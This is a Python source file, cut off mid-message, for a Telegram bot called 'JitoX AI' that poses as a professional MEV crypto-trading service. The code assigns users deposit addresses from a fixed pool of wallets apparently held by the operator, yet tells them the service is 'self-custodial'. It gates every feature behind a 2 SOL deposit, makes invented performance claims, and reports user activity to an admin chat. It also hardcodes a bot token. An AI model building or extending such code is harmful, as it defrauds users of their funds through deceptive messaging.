import logging
import asyncio
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import random
import string
import aiohttp
import json
import sys
import os
import importlib.util
from flask import Flask, jsonify
import csv
import aiosqlite
import datetime
from pathlib import Path
from datetime import datetime, timezone
import pandas as pd
from broadcast import BroadcastSystem
from telegram.error import NetworkError, TimedOut, InvalidToken
from telegram.request import HTTPXRequest
import shutil
import re
import time
import nacl
import nacl.signing
import base58

app = Flask(__name__)

# Enable logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

sys.path.append(r'C:\Users\USUARIO\Desktop\Main Jito File')

# Directly link to the shared_data.py file
shared_data_path = r"C:\Users\USUARIO\Desktop\Main Jito File\shared_data.py"
spec = importlib.util.spec_from_file_location("shared_data", shared_data_path)
shared_data = importlib.util.module_from_spec(spec)
spec.loader.exec_module(shared_data)
save_blocked_users = shared_data.save_blocked_users
load_blocked_users = shared_data.load_blocked_users

# Constants for Solana interaction
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"
WALLET_CSV_FILE = "wallets.csv"
NOTIFICATION_CHAT_ID = "-1001943517712"  # Replace with your actual chat ID

# Constants for transfer safety
MINIMUM_BALANCE = 0.001  # Minimum SOL to keep for gas
MAX_RETRIES = 3  # Maximum number of retry attempts for failed transfers
CONFIRMATION_BLOCKS = 32  # Number of blocks to wait for confirmation
ADMIN_WALLET = "25JKsVDeX4monwCdWewsDpDKMzws39xsb9oWdhZESr7L"

# In-memory storage
wallet_balances = {}  # Cache for wallet balances
pending_transactions = set()  # Track pending transactions

# Ensure wallet CSV file exists with headers
if not os.path.exists(WALLET_CSV_FILE):
    with open(WALLET_CSV_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['user_id', 'public_key', 'private_key', 'created_at'])

# Database path for referrals
REFERRAL_DB_PATH = Path('data/referrals.db')

async def init_referral_db():
    """Initialize the referral database with necessary tables."""
    try:
        # Create database directory if it doesn't exist
        REFERRAL_DB_PATH.parent.mkdir(exist_ok=True)
        
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Create referral_codes table
            await db.execute('''
                CREATE TABLE IF NOT EXISTS referral_codes (
                    user_id INTEGER PRIMARY KEY,
                    code TEXT UNIQUE NOT NULL,
                    created_at TEXT DEFAULT (datetime('now'))
                )
            ''')
            
            # Create referrals table
            await db.execute('''
                CREATE TABLE IF NOT EXISTS referrals (
                    referrer_id INTEGER,
                    referred_id INTEGER,
                    created_at TEXT DEFAULT (datetime('now')),
                    earnings REAL DEFAULT 0.05,
                    PRIMARY KEY (referrer_id, referred_id)
                )
            ''')
            
            await db.commit()
            
            # Verify tables were created
            async with db.execute("SELECT name FROM sqlite_master WHERE type='table'") as cursor:
                tables = await cursor.fetchall()
                tables = [table[0] for table in tables]
                if 'referral_codes' not in tables or 'referrals' not in tables:
                    raise Exception("Failed to create required tables")
            
            logger.info("Referral database initialized successfully")
            return True
    except Exception as e:
        logger.error(f"Error initializing referral database: {e}")
        raise

async def store_referral_code(user_id: int, code: str) -> bool:
    """Store a user's referral code in the database."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            await db.execute(
                'INSERT OR REPLACE INTO referral_codes (user_id, code) VALUES (?, ?)',
                (user_id, code)
            )
            await db.commit()
            return True
    except Exception as e:
        logger.error(f"Error storing referral code: {e}")
        return False

async def get_referral_code(user_id: int) -> str:
    """Get a user's referral code from the database."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            async with db.execute(
                'SELECT code FROM referral_codes WHERE user_id = ?',
                (user_id,)
            ) as cursor:
                result = await cursor.fetchone()
                return result[0] if result else None
    except Exception as e:
        logger.error(f"Error getting referral code: {e}")
        return None

async def store_referral(referrer_id: int, referred_id: int) -> bool:
    """Store a referral relationship in the database."""
    try:
        # Ensure database exists
        await init_referral_db()
        
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Insert the referral with current timestamp using SQLite's datetime function
            await db.execute(
                'INSERT OR IGNORE INTO referrals (referrer_id, referred_id, created_at, earnings) VALUES (?, ?, datetime("now"), 0.05)',
                (referrer_id, referred_id)
            )
            await db.commit()
            logger.info(f"Successfully stored referral: {referred_id} referred by {referrer_id}")
            return True
    except Exception as e:
        logger.error(f"Error storing referral: {e}")
        return False

async def get_user_referrals(user_id: int) -> list:
    """Get all referrals for a user from the database."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            await init_referral_db()  # Ensure tables exist
            async with db.execute(
                'SELECT referred_id, created_at, earnings FROM referrals WHERE referrer_id = ?',
                (user_id,)
            ) as cursor:
                referrals = await cursor.fetchall()
                logger.info(f"Retrieved {len(referrals)} referrals for user {user_id}")
                return referrals
    except Exception as e:
        logger.error(f"Error getting user referrals: {e}")
        return []

async def update_referral_earnings(referrer_id: int, amount: float) -> bool:
    """Update the earnings for a referrer."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            await db.execute(
                'UPDATE referrals SET earnings = earnings + ? WHERE referrer_id = ?',
                (amount, referrer_id)
            )
            await db.commit()
            logger.info(f"Updated earnings for referrer {referrer_id}: +{amount} SOL")
            return True
    except Exception as e:
        logger.error(f"Error updating referral earnings: {e}")
        return False

async def notify_referrer(application: Application, referrer_id: int, referred_username: str):
    """Send notification to referrer about new referral."""
    try:
        message = (
            "🟣 <b>New Referral Alert!</b> 🟣\n\n"
            f"User @{referred_username} has joined using your referral link!\n\n"
            "💫 <b>Rewards:</b>\n"
            "• 0.05 SOL initial bonus\n"
            "• 1% of their trading operations\n\n"
            "Keep sharing your link to earn more rewards! 🎮"
        )
        await application.bot.send_message(
            chat_id=referrer_id,
            text=message,
            parse_mode='HTML'
        )
        logger.info(f"Sent referral notification to user {referrer_id} for referral {referred_username}")
    except Exception as e:
        logger.error(f"Error sending referral notification: {e}")
        # Try sending without parse_mode if HTML formatting fails
        try:
            simple_message = f"New referral alert! User {referred_username} has joined using your referral link!"
            await application.bot.send_message(
                chat_id=referrer_id,
                text=simple_message
            )
            logger.info(f"Sent simple referral notification to user {referrer_id}")
        except Exception as e2:
            logger.error(f"Error sending simple referral notification: {e2}")

# Your bot token
BOT_TOKEN = "7545725152:AAHFk6Eco9971SQxU8Z0cuJTLNzDejNC1mE"

# Notification chat ID
NOTIFICATION_CHAT_ID = -4540844698

# Solana RPC URL
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

# Predefined list of Solana wallet addresses
# Predefined list of Solana wallet addresses
wallet_addresses = [

    "9mKRv7cvDWghpicV7LKfPotkjxy4CzebrCkEmW79qpYD", 
    "BxKwWoK9neSdm2movsExse8fNh8NQ4sg5iGq73skFzcL",
    "728YT1D7kAZmtwAHtU5WKrjaMaSaRHcggugdy5C1QwZg",
    "HmBZv2NBgWDdsnh7no4eyNycafuFTUcxYsVgyLSrPKAa",
    "4yqA5A56wSj4TaDd9ghuGXcVhynz3P2rNidBWrQvpDZA",
    "HpQmgZHr9g4cFyiCUia3CcaP7N9hBhDJGzGMD3mdL76N"
]

# Dictionary mapping wallet addresses to their private keys
wallet_private_keys = {
  
    "HnpZCbjFZnVSXEmdbxE8JTr9eou26yjDZjLctjapmYmH": None,
    "9mKRv7cvDWghpicV7LKfPotkjxy4CzebrCkEmW79qpYD": None,
    "BxKwWoK9neSdm2movsExse8fNh8NQ4sg5iGq73skFzcL": None,
    "728YT1D7kAZmtwAHtU5WKrjaMaSaRHcggugdy5C1QwZg": None,
    "HmBZv2NBgWDdsnh7no4eyNycafuFTUcxYsVgyLSrPKAa": None,
    "4yqA5A56wSj4TaDd9ghuGXcVhynz3P2rNidBWrQvpDZA": None,
    "HpQmgZHr9g4cFyiCUia3CcaP7N9hBhDJGzGMD3mdL76N": None,

}

# Predefined list of ETH wallet addresses
eth_wallet_addresses = [
    "0x7531F7e1454B1b58e9f79c9DAba6b37ded7493ae",
    "0x4DA42366606618af1346567C6A42486077140c78",
    "0xd1F7C80dA04FEe577A7f47bF35dac0236b6F3572",
    "0x95a63c981Cab717eBE4D8152a062CA4BeBE12d08",
    "0x5665B94C16Ec92fc2670ae987eBdA316677a5eb8",
    "0xde2FD6dE669F11c5DC4A4E71c94701DC0eEfB588",
    "0x98Fe56189db36bc557f2E498BB54983696D1E1E8"
]

# Store ETH user wallets
eth_user_wallets = {}

# Store user wallets
user_wallets = {}

# Store user wallets and their MEV sniper status
user_data = {}

# Store referral data
referrals = {}
referral_earnings = {}
referral_codes = {}

# Move this section right after your imports and initial configurations
# (around line 70, before any command handlers)

# Database initialization
DB_PATH = Path('data/jitox_data.db')
DB_PATH.parent.mkdir(exist_ok=True)

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                referrer_id INTEGER,
                referred_id INTEGER,
                timestamp TEXT,
                earnings REAL DEFAULT 0.05,
                PRIMARY KEY (referrer_id, referred_id)
            )
        ''')
        await db.commit()
        logger.info("Database initialized successfully")

async def store_referral(referrer_id: int, referred_id: int) -> bool:
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            timestamp = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
            await db.execute('''
                INSERT OR IGNORE INTO referrals 
                (referrer_id, referred_id, timestamp, earnings)
                VALUES (?, ?, ?, 0.05)
            ''', (referrer_id, referred_id, timestamp))
            await db.commit()
            logger.info(f"Stored referral: {referrer_id} referred {referred_id}")
            return True
    except Exception as e:
        logger.error(f"Error storing referral: {e}")
        return False

async def get_user_referrals(user_id: int) -> list:
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute('''
                SELECT referred_id, timestamp, earnings 
                FROM referrals 
                WHERE referrer_id = ?
            ''', (user_id,)) as cursor:
                referrals = await cursor.fetchall()
                logger.info(f"Retrieved {len(referrals)} referrals for user {user_id}")
                return referrals
    except Exception as e:
        logger.error(f"Error getting referrals: {e}")
        return []

async def update_referral_earnings(referrer_id: int, amount: float) -> bool:
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute('''
                UPDATE referrals 
                SET earnings = earnings + ?
                WHERE referrer_id = ?
            ''', (amount, referrer_id))
            await db.commit()
            logger.info(f"Updated earnings for referrer {referrer_id}: +{amount} SOL")
            return True
    except Exception as e:
        logger.error(f"Error updating referral earnings: {e}")
        return False

def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def global_exception_handler(exctype, value, traceback):
    error_msg = f"Uncaught exception: {exctype.__name__}: {str(value)}"
    print(error_msg, file=sys.stderr)
    print("Traceback:", file=sys.stderr)
    import traceback as tb
    tb.print_tb(traceback, file=sys.stderr)

sys.excepthook = global_exception_handler

def read_user_ids_from_csv(file_path):
    user_ids = []
    with open(file_path, mode='r', newline='', encoding='utf-8') as csvfile:
        csvreader = csv.reader(csvfile)
        header = next(csvreader)[0].split(',')  # Manually split the header row
        logging.debug(f"CSV Header: {header}")
        if 'user_id' in header:
            user_id_index = header.index('user_id')
            for row in csvreader:
                if row:  # Check if the row is not empty
                    row = row[0].split(',')  # Manually split each row
                    logging.debug(f"CSV Row: {row}")
                    if len(row) > user_id_index:  # Ensure the row has enough columns
                        user_ids.append(row[user_id_index])
    logging.debug(f"Extracted user IDs: {user_ids}")
    return user_ids

csv_file_path = r'C:\Users\USUARIO\Desktop\Bot\Demo ( Testing )\new demo v.1.1.2\Bot And Database\JITO PRO\Ui Send Messages Bot\exported_user_data.csv'
user_ids = read_user_ids_from_csv(csv_file_path)
logging.debug(f"User IDs from CSV: {user_ids}")

def is_user_blocked(user_id):
    blocked_users = load_blocked_users()  # Reload the blocked users set
    logger.info(f"Checking if user {user_id} is blocked...")
    logger.info(f"Blocked users: {blocked_users}")
    return int(user_id) in blocked_users  # Ensure user_id is checked as an integer

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error(f"Exception while handling an update: {context.error}")
    # Log the full traceback
    import traceback
    logger.error(traceback.format_exc())

async def nexus_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "👾 <b>JitoX AI - Professional MEV Trading Suite</b> 👾\n\n"
        "Experience institutional-grade MEV trading with our comprehensive toolkit:\n\n"
        "🎮 <b>Essential Features</b>\n\n"
        "🎯 Liquidity Management: Professional-grade pool optimization\n"
        "⚡ Strategy Calibration: Fine-tune execution parameters\n"
        "🎲 Asset Targeting: Precision market positioning\n"
        "🤖 Automated Trading: Enterprise-level execution\n\n"
        "🌟 <b>Advanced Suite</b>\n\n"
        "💫 Strategy Development: Institutional trading frameworks\n"
        "🧠 AI Analytics: Machine learning market insights\n"
        "📊 Performance Metrics: Real-time data analytics\n"
        "🛡️ Risk Framework: Enterprise risk management\n\n"
        "⚔️ <b>Professional Controls</b>\n\n"
        "💎 Portfolio Management: Multi-strategy deployment\n"
        "🔐 Security Protocol: Institutional-grade protection\n"
        "🔄 Account Integration: Seamless multi-portfolio control\n\n"
        "🚀 <b>Enterprise Tools</b>\n\n"
        "📈 Market Intelligence: Advanced predictive modeling\n"
        "📉 Technical Analysis: Professional charting suite\n"
        "🌐 Trading Network: Institutional knowledge sharing\n\n"
        "<b>Activate Professional Suite:</b> Trading balance of 2 SOL is required to operate\n\n"
        "Ready to elevate your trading with institutional-grade MEV strategies? 🎮"
    )
    keyboard = [
            # Core Trading Suite
            [InlineKeyboardButton("⚔️ Trading Matrix", callback_data='pool_settings'),
             InlineKeyboardButton("⚡️ Execution Protocol", callback_data='intensity')],
            
            # Strategic Operations
            [InlineKeyboardButton("🎯 Asset Targeting", callback_data='token_targeting'),
             InlineKeyboardButton("👾 Auto MEV Suite", callback_data='auto_mev')],
            
            # Intelligence Framework
            [InlineKeyboardButton("🔮 AI Strategy Matrix", callback_data='ai_strategy'),
             InlineKeyboardButton("⚡️ Neural Predictions", callback_data='ai_market_predictions')],
            
            # Risk Architecture
            [InlineKeyboardButton("🛡️ Risk Framework", callback_data='risk_management'),
             InlineKeyboardButton("⚔️ Dynamic Protection", callback_data='dynamic_risk')],
            
            # Performance Suite
            [InlineKeyboardButton("📊 Performance Matrix", callback_data='performance_analytics'),
             InlineKeyboardButton("💎 Historical Analysis", callback_data='historical_analysis')],
            
            # Advanced Features
            [InlineKeyboardButton("⚡️ Strategy Synthesis", callback_data='strategy_customization'),
             InlineKeyboardButton("🎯 Position Alerts", callback_data='custom_alerts')],
            
            # Portfolio Management
            [InlineKeyboardButton("💎 Portfolio Matrix", callback_data='diversification'),
             InlineKeyboardButton("🔮 Asset Watchlist", callback_data='token_watchlist')],
            
            # Professional Tools
            [InlineKeyboardButton("⚔️ Copy Trading Suite", callback_data='copy_trading'),
             InlineKeyboardButton("👾 Multi-Account", callback_data='multi_account')],
            
            # Security Framework
            [InlineKeyboardButton("🛡️ Security Matrix", callback_data='security_settings'),
             InlineKeyboardButton("⚡️ Risk Profiling", callback_data='risk_profiling')],
            
            # Community Features
            [InlineKeyboardButton("💎 Strategy Network", callback_data='strategy_sharing'),
             InlineKeyboardButton("👾 User Profiles", callback_data='user_profiles')],
            
            # Advanced Charting
            [InlineKeyboardButton("📊 Professional Charts", callback_data='advanced_charting')],
            
            # Custom Solutions
            [InlineKeyboardButton("⚔️ Custom Trading Matrix", callback_data='custom_trading_bots')],
            
            # Navigation
            [InlineKeyboardButton("🔙 Return to Command Center", callback_data='back')]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    try:
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
        logger.debug("Message edited successfully")
    except Exception as e:
        logger.error(f"Error editing message in nexus_settings: {e}")
        return

    try:
        logger.debug("Logging user activity")
        await log_user_activity(context.application, user_id, "accessed Nexus Settings")
    except Exception as e:
        logger.error(f"Error logging user activity in nexus_settings: {e}")

    # Notify admin
    admin_chat_id = -4540844698  # Your admin chat ID
    admin_message = f"User {user_id} accessed Nexus Settings"
    try:
        logger.debug("Sending admin notification")
        await context.bot.send_message(chat_id=admin_chat_id, text=admin_message)
        logger.debug("Admin notification sent successfully")
    except Exception as e:
        logger.error(f"Error sending admin notification in nexus_settings: {e}")

    logger.debug("Exiting nexus_settings function")

async def auto_mev(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "👾 <b>Auto MEV</b> 👾\n\n"
        "💎 <b>Deposit 2 SOL to unlock Auto MEV!</b> 💎\n\n"
        "Auto MEV automatically executes MEV strategies for you:\n\n"
        "⚡ 24/7 operation\n"
        "🧠 AI-driven decision making\n"
        "🚀 Optimized for maximum profits\n\n"
        "🔐 <b>Current Status:</b> Locked\n"
        "💎 <b>Minimum Balance:</b> 2 SOL\n"
        "✨ <b>Recommended Balance:</b> 5 SOL for VIP features\n\n"
        "Deposit now to start earning passive income with Auto MEV! 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Auto MEV settings")

async def token_targeting(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "🎯 <b>Token Targeting</b> 🎯\n\n"
        "💎 <b>Deposit 2 SOL to unlock Token Targeting!</b> 💎\n\n"
        "Customize your MEV strategy with specific token targets:\n\n"
        "⚡ Add up to 100 custom tokens\n"
        "⚡ Set individual strategies per token\n"
        "⚡ Receive alerts for targeted tokens\n\n"
        "🔐 <b>Current Status:</b> Locked\n"
        "💎 <b>Minimum Balance:</b> 2 SOL\n"
        "✨ <b>Recommended Balance:</b> 5 SOL for expanded targeting\n\n"
        "Deposit now to start targeting your favorite tokens! 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Token Targeting settings")

async def intensity(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "⚡ <b>MEV Intensity Control</b> ⚡\n\n"
        "Current Intensity: <b>MEDIUM</b>\n\n"
        "Adjust the intensity of MEV operations:\n\n"
        "🎯 Low: Fewer operations, lower risk\n"
        "💫 Medium: Balanced approach\n"
        "🚀 High: Maximum operations\n\n"
        "💎 <b>Deposit 2 SOL to adjust intensity!</b> 💎\n"
        "✨ Pro Tip: Higher intensity can lead to higher profits! 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("🟢 Low", callback_data='intensity_low'),
         InlineKeyboardButton("🟡 Medium", callback_data='intensity_medium'),
         InlineKeyboardButton("🔴 High", callback_data='intensity_high')],
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Intensity settings")

async def pool_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    message = (
        "👾 <b>JitoX AI - Professional Liquidity Management Suite</b> 👾\n\n"
        "Experience institutional-grade liquidity optimization with our advanced toolkit:\n\n"
        "🎮 <b>Core Features</b>\n\n"
        "⚡️ Dynamic Pool Selection: AI-driven liquidity allocation\n"
        "⚡️ Auto-Rebalancing: Real-time portfolio optimization\n"
        "⚡️ Performance Analytics: Professional-grade metrics\n\n"
        "💎 <b>Professional Benefits</b>\n\n"
        "⚔️ Priority Pool Access\n"
        "⚔️ Advanced Risk Management\n"
        "⚔️ Institutional-Grade Tools\n\n"
        "🛡️ <b>Current Status:</b> Awaiting Initialization\n"
        "🎯 <b>Required Balance:</b> 2 SOL\n"
        "✨ <b>Enhanced Access:</b> 5+ SOL for institutional features\n\n"
        "<b>Activate Professional Suite:</b> Initialize with 2 SOL to access institutional-grade liquidity management\n\n"
        "Ready to elevate your liquidity strategy with professional-grade tools? 🎮"
    )
    keyboard = [
        [InlineKeyboardButton("📊 Pool Stats", callback_data='pool_stats')],
        [InlineKeyboardButton("🔑 Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    await log_user_activity(context.application, user_id, "accessed Pool Settings")

async def send_blocked_users_notification():
    blocked_users = load_blocked_users()
    if blocked_users:
        message = "Blocked Users:\n" + "\n".join(map(str, blocked_users))
    else:
        message = "No blocked users."
    
    bot = Bot(token=BOT_TOKEN)
    try:
        await bot.send_message(chat_id=NOTIFICATION_CHAT_ID, text=message)
        logger.info("Blocked users notification sent successfully.")
    except Exception as e:
        logger.error(f"Failed to send blocked users notification: {e}")

async def notify_admin_blocked_user(user_id):
    message = f"Blocked user {user_id} attempted to use the bot."
    bot = Bot(token=BOT_TOKEN)
    try:
        await bot.send_message(chat_id=NOTIFICATION_CHAT_ID, text=message)
        logger.info(f"Notification sent for blocked user {user_id}.")
    except Exception as e:
        logger.error(f"Failed to send notification for blocked user {user_id}: {e}")

async def get_balance(wallet_address):
    logger.info(f"Getting balance for wallet {wallet_address}")
    url = SOLANA_RPC_URL
    headers = {"Content-Type": "application/json"}
    data = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "getBalance",
        "params": [wallet_address]
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, json=data) as response:
                result = await response.json()
                logger.info(f"RPC response for {wallet_address}: {result}")
                if 'result' in result and 'value' in result['result']:
                    balance = result['result']['value'] / 10**9  # Convert lamports to SOL
                    logger.info(f"Balance for {wallet_address}: {balance} SOL")
                    return balance
                else:
                    logger.warning(f"Unexpected response format for {wallet_address}: {result}")
                    return 0
    except Exception as e:
        logger.error(f"Error getting balance for {wallet_address}: {e}")
        return 0

def print_referral_state():
    logger.info("Current Referral State:")
    logger.info(f"Referral Codes: {referral_codes}")
    logger.info(f"Referrals: {referrals}")
    logger.info(f"Referral Earnings: {referral_earnings}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /start command."""
    try:
        user = update.effective_user
        # Store new user
        await store_new_user(user.id, user.username)
        
        logger.info(f"User ID: {user.id}")
        if is_user_blocked(user.id):
            await update.message.reply_text("You are blocked from using this bot.")
            await notify_admin_blocked_user(user.id)
            return
        await log_user_activity(context.application, user.id, "used /start command")
        
        logger.info(f"Start command used by user {user.id}")
        
        # Handle referral
        if context.args:
            referral_code = context.args[0]
            logger.info(f"Referral code received: {referral_code}")
            try:
                async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
                    # Ensure tables exist
                    await init_referral_db()
                    
                    # Find referrer
                    async with db.execute(
                        'SELECT user_id FROM referral_codes WHERE code = ?',
                        (referral_code,)
                    ) as cursor:
                        result = await cursor.fetchone()
                        if result and result[0] != user.id:  # Prevent self-referral
                            referrer_id = result[0]
                            logger.info(f"Found referrer ID: {referrer_id}")
                            
                            # Send notifications regardless of existing referral
                            await notify_referrer(context.application, referrer_id, user.username or "Anonymous")
                            await send_admin_notification(
                                context.application,
                                f"🟣 New Referral Attempt: User {user.id} (@{user.username}) using code from {referrer_id}"
                            )
                            
                            # Store referral if it doesn't exist
                            async with db.execute(
                                'SELECT * FROM referrals WHERE referrer_id = ? AND referred_id = ?',
                                (referrer_id, user.id)
                            ) as cursor:
                                existing_referral = await cursor.fetchone()
                                
                            if not existing_referral:
                                # Store referral and update earnings
                                if await store_referral(referrer_id, user.id):
                                    logger.info(f"Successfully stored new referral: {user.id} referred by {referrer_id}")
                                    await send_admin_notification(
                                        context.application,
                                        f"🟣 Referral Stored: User {user.id} (@{user.username}) was referred by {referrer_id}"
                                    )
                                else:
                                    logger.error("Failed to store referral")
                            else:
                                logger.info(f"Existing referral found for user {user.id} and referrer {referrer_id}")
                        else:
                            logger.info(f"Invalid referral code or self-referral attempt: {referral_code}")
            except Exception as e:
                logger.error(f"Error processing referral: {e}")
                await send_admin_notification(
                    context.application,
                    f"❌ Error processing referral for user {user.id}: {str(e)}"
                )
        
        # Generate or get existing referral code
        try:
            referral_code = await get_referral_code(user.id)
            if not referral_code:
                referral_code = generate_referral_code()
                logger.info(f"Generated new referral code for user {user.id}: {referral_code}")
                await store_referral_code(user.id, referral_code)
        except Exception as e:
            logger.error(f"Error handling referral code: {e}")
            referral_code = None
        
        # Create the MEV Stats button with the user's wallet address
        wallet_address = user_wallets.get(user.id, "")
        mev_stats_url = f"https://jitonexus.github.io/jitox-dashboard/"
        mev_stats_button = InlineKeyboardButton("🚨 Mev App 🚨", web_app=WebAppInfo(url=mev_stats_url))
        
        keyboard = [
            [InlineKeyboardButton("⚔️ Professional Suite", callback_data='nexus_settings')],
            [InlineKeyboardButton("💎 Initialize Wallet", callback_data='get_wallet'),
             InlineKeyboardButton("⚡️ Strategic Withdrawal", callback_data='withdraw')],
            [InlineKeyboardButton("🎯 Activate MEV", callback_data='start_mev'),
             InlineKeyboardButton("🛡️ Suspend MEV", callback_data='stop_mev')],
            [InlineKeyboardButton("⚡️ ETH MEV Bot", callback_data='get_eth_wallet')],
            [InlineKeyboardButton("📊 Active Positions", callback_data='mev_positions'),
             InlineKeyboardButton("🔮 Pending Matrix", callback_data='mev_pending')],
            [InlineKeyboardButton("📊 Performance Analytics", callback_data='track_mev')],
            [InlineKeyboardButton("👾 Command Guide", callback_data='help'),
             InlineKeyboardButton("💎 Intelligence Hub", callback_data='info')],
            [InlineKeyboardButton("⚡️ Professional Network", callback_data='referral')],
            [mev_stats_button],
            [InlineKeyboardButton("🔮 Enterprise Portal", url='https://jitoxmev.com/')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = (
            "👾 <b>Welcome to JitoX AI - Professional MEV Trading Suite</b> 👾\n\n"
            "⚔️ <b>JitoX AI is a professional trading platform - your deposit is your trading balance</b>\n\n"
            "💎 Limited allocation available: 2 SOL minimum deposit\n"
            "💎 Industry-leading rate: Only 2% performance fee\n\n"
            "🎮 <b>Start Trading with 2 SOL:</b>\n\n"
            "⚡ 24/7 Automated MEV Operations\n"
            "⚡ Advanced Arbitrage & Strategic Position Taking\n"
            "⚡ 98.7% Execution Success Rate\n"
            "⚡ Fully Compliant with Telegram's Terms of Service\n"
            "🛡️ <b>Self-Custodial: Your Assets, Your Control</b>\n\n"
            "🚀 <b>Trading Balance Required for Operation</b>\n\n"
            "🎯 <b>Next Steps:</b>\n"
            "1. Initialize Wallet Setup /get_wallet\n"
            "2. Fund Account (2 SOL or more)\n"
            "3. Begin Automated Trading\n\n"
            "✨ <b>EXCLUSIVE: Priority MEV Intelligence Access</b>\n\n"
            "🌐 <b>Professional Network:</b> <a href='https://t.me/+IjTbnbN3Y085MjA0'>Join Our Trading Community</a>\n\n"
            "💫 <b>Support Available - Limited Slots Remaining</b>\n\n"
            "Professional traders understand: Timing is everything in MEV. ⚡"
        )
        
        if update.message:
            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML', disable_web_page_preview=True)
        elif update.callback_query:
            await update.callback_query.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML', disable_web_page_preview=True)
    except Exception as e:
        logger.error(f"Error in start command: {str(e)}")
        await update.message.reply_text("An error occurred. Please try again later.")

async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    
    if update.callback_query:
        message_func = update.callback_query.edit_message_text
    else:
        message_func = update.message.reply_text

    if user_id not in user_wallets:
        if wallet_addresses:
            wallet = wallet_addresses.pop(0)
            user_wallets[user_id] = wallet
            await log_user_activity(context.application, user_id, f"was assigned wallet: {wallet}")
            message = (
                "🎉 <b>Congratulations! Your JitoX AI Professional Trading Suite Access is Now Active</b> 🎉\n\n"
                "🔒 <b>Your Secure SOL Trading Wallet:</b>\n"
                f"<code>{wallet}</code>\n\n"
                "🔐 <b>Private Key Security:</b>\n"
                "To ensure the utmost security of your funds, your private key will be automatically generated and securely stored after your first deposit.\n\n"
                "💰 <b>Activation Steps:</b>\n"
                "1. Deposit a minimum of 2 SOL to your assigned wallet address\n"
                "2. Upon detecting your first transaction, we will generate and encrypt your private key\n"
                "3. Access your private key anytime in your account settings\n\n"
                "🚀 <b>Unleash the Power of JitoX AI:</b>\n"
                "• Tap into institutional-grade MEV opportunities on Solana\n"
                "• Maximize your returns with advanced algorithms\n"
                "• Benefit from real-time market insights and analytics\n\n"
                "💸 <b>Exclusive Rewards for Early Adopters:</b>\n"
                "• Reduced performance fees for the first 30 days\n"
                "• Priority access to new Solana trading strategies\n"
                "• Referral program with attractive SOL commissions\n\n"
                "⏰ <b>Time-Limited Opportunity:</b>\n"
                "JitoX AI Professional Trading Suite slots for Solana are filling up quickly. Secure your spot now and gain a competitive edge in the market.\n\n"
                "👨‍💼 <b>Dedicated Support:</b>\n"
                "Our professional support team is available 24/7 to assist you. Reach out to @jitoxai for personalized guidance.\n\n"
                "🏆 <b>Join the Elite Solana Traders' Circle:</b>\n"
